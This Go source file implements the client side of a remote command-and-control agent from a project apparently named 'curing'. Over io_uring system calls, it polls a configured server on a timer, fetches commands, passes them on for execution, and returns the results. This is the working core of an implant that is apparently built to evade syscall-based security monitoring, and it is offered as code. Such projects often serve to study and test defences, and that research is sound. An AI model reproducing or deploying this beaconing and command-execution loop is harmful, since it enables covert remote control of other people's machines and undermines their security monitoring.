//go:build linux

package executer

import (
	"bytes"
	"context"
	"encoding/gob"
	"io"
	"log/slog"
	"net"
	"syscall"
	"time"

	"github.com/amitschendel/curing/pkg/common"
	"github.com/amitschendel/curing/pkg/config"
	"github.com/iceber/iouring-go"
)

type IExecuter interface {
	SetCommandsChannel(commands chan common.Command)
	GetOutputChannel() chan common.Result
}

type Executer struct {
	commands   chan common.Command
	output     chan common.Result
	ring       *iouring.IOURing
	cfg        *config.Config
	resultChan chan iouring.Result
	ctx        context.Context
	cancelFunc context.CancelFunc
	interval   time.Duration
	buffer     bytes.Buffer // Buffer for gob encoding/decoding
}

var _ IExecuter = (*Executer)(nil)

func NewExecuter(cfg *config.Config, ctx context.Context) (*Executer, error) {
	ring, err := iouring.New(32)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(ctx)
	return &Executer{
		ring:       ring,
		cfg:        cfg,
		ctx:        ctx,
		cancelFunc: cancel,
		commands:   make(chan common.Command, 100),
		output:     make(chan common.Result, 100),
		resultChan: make(chan iouring.Result, 32),
		interval:   time.Duration(cfg.ConnectIntervalSec) * time.Second,
	}, nil
}

// SetInterval allows configuring the connection interval
func (e *Executer) SetInterval(d time.Duration) {
	e.interval = d
}

func (e *Executer) SetCommandsChannel(commands chan common.Command) {
	e.commands = commands
}

func (e *Executer) GetOutputChannel() chan common.Result {
	return e.output
}

// Run handles the main execution loop
func (e *Executer) Run() {
	ticker := time.NewTicker(e.interval)
	defer ticker.Stop()

	// Initial connection and read
	e.connectReadAndProcess()

	for {
		select {
		case <-e.ctx.Done():
			e.Close()
			return
		case <-ticker.C:
			e.connectReadAndProcess()
		}
	}
}

// connectReadAndProcess handles a single connection cycle
func (e *Executer) connectReadAndProcess() {
	// Connect
	fd, err := e.connect()
	if err != nil {
		slog.Error("Error connecting to server", "error", err)
		return
	}

	defer func() {
		if err := e.close(fd); err != nil {
			slog.Error("Error closing connection", "error", err)
		}
	}()

	// Send GetCommands request
	req := &common.Request{
		Type: common.GetCommands,
	}
	if err := e.sendGobRequest(fd, req); err != nil {
		slog.Error("Error sending request", "error", err)
		return
	}

	// Read and decode commands
	commands, err := e.readGobCommands(fd)
	if err != nil && err != io.EOF {
		slog.Error("Error reading commands", "error", err)
		return
	}

	if len(commands) > 0 {
		e.processCommands(commands)
	}
}

func (e *Executer) sendGobRequest(fd int, req *common.Request) error {
	e.buffer.Reset()
	encoder := gob.NewEncoder(&e.buffer)

	if err := encoder.Encode(req); err != nil {
		return err
	}

	_, err := e.write(fd, e.buffer.Bytes())
	return err
}

func (e *Executer) readGobCommands(fd int) ([]common.Command, error) {
	data, err := e.readUntilEmpty(fd)
	if err != nil {
		return nil, err
	}

	decoder := gob.NewDecoder(bytes.NewReader(data))
	var commands []common.Command
	if err := decoder.Decode(&commands); err != nil {
		return nil, err
	}

	return commands, nil
}

func (e *Executer) sendResults(fd int, results []common.Result) error {
	req := &common.Request{
		Type:    common.SendResults,
		Results: results,
	}
	return e.sendGobRequest(fd, req)
}

func (e *Executer) processCommands(commands []common.Command) {
	for _, cmd := range commands {
		slog.Info("Processing command", "command", cmd)
		e.commands <- cmd

		// Collect results from output channel
		var results []common.Result
		// Non-blocking collection of results
		select {
		case result := <-e.output:
			results = append(results, result)
		default:
			// No results available
		}

		// If we have results, send them back
		if len(results) > 0 {
			fd, err := e.connect()
			if err != nil {
				slog.Error("Error connecting to send results", "error", err)
				continue
			}

			if err := e.sendResults(fd, results); err != nil {
				slog.Error("Error sending results", "error", err)
			}

			e.close(fd)
		}
	}
}

// readUntilEmpty reads from the file descriptor until no more data is available
func (e *Executer) readUntilEmpty(fd int) ([]byte, error) {
	var fullData []byte
	const chunkSize = 4096

	for {
		buf := make([]byte, chunkSize)
		n, err := e.read(fd, buf)

		if err != nil {
			if len(fullData) > 0 {
				return fullData, nil
			}
			return nil, err
		}

		if n == 0 {
			if len(fullData) > 0 {
				return fullData, nil
			}
			return nil, io.EOF
		}

		fullData = append(fullData, buf[:n]...)

		// If we received less than chunkSize, assume no more data is immediately available
		if n < chunkSize {
			break
		}
	}

	return fullData, nil
}

// connect establishes a connection to the server
func (e *Executer) connect() (int, error) {
	var sockfd int
	request, err := iouring.Connect(sockfd, &syscall.SockaddrInet4{
		Port: e.cfg.Server.Port,
		Addr: func() [4]byte {
			var addr [4]byte
			copy(addr[:], net.ParseIP(e.cfg.Server.Host).To4())
			return addr
		}(),
	})
	if err != nil {
		return -1, err
	}

	if _, err := e.ring.SubmitRequest(request, e.resultChan); err != nil {
		return -1, err
	}

	result := <-e.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	sockfd = result.ReturnValue0().(int)
	sockaddr := result.ReturnValue1().(*syscall.SockaddrInet4)
	slog.Info("Connected to server", "sockfd", sockfd, "sockaddr", sockaddr)

	return sockfd, nil
}

// read performs a single read operation from the file descriptor
func (e *Executer) read(fd int, buf []byte) (int, error) {
	request := iouring.Read(fd, buf)
	if _, err := e.ring.SubmitRequest(request, e.resultChan); err != nil {
		return -1, err
	}

	result := <-e.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	buf, _ = result.GetRequestBuffer()
	buf = buf[:n]

	return n, nil
}

// write sends data to the file descriptor
func (e *Executer) write(fd int, buf []byte) (int, error) {
	request := iouring.Write(fd, buf)
	if _, err := e.ring.SubmitRequest(request, e.resultChan); err != nil {
		return -1, err
	}

	result := <-e.resultChan
	if result.Err() != nil {
		return -1, result.Err()
	}

	n := result.ReturnValue0().(int)
	slog.Info("Wrote to file descriptor", "fd", fd, "n", n)

	return n, nil
}

// close closes the file descriptor
func (e *Executer) close(fd int) error {
	request := iouring.Close(fd)
	if _, err := e.ring.SubmitRequest(request, e.resultChan); err != nil {
		return err
	}

	result := <-e.resultChan
	if result.Err() != nil {
		return result.Err()
	}

	slog.Info("Closed file descriptor", "fd", fd)
	return nil
}

// Close gracefully shuts down the Executer
func (e *Executer) Close() {
	e.cancelFunc()

	if e.ring != nil {
		_ = e.ring.Close()
	}

	close(e.commands)
	close(e.output)

	slog.Info("Executer closed")
}
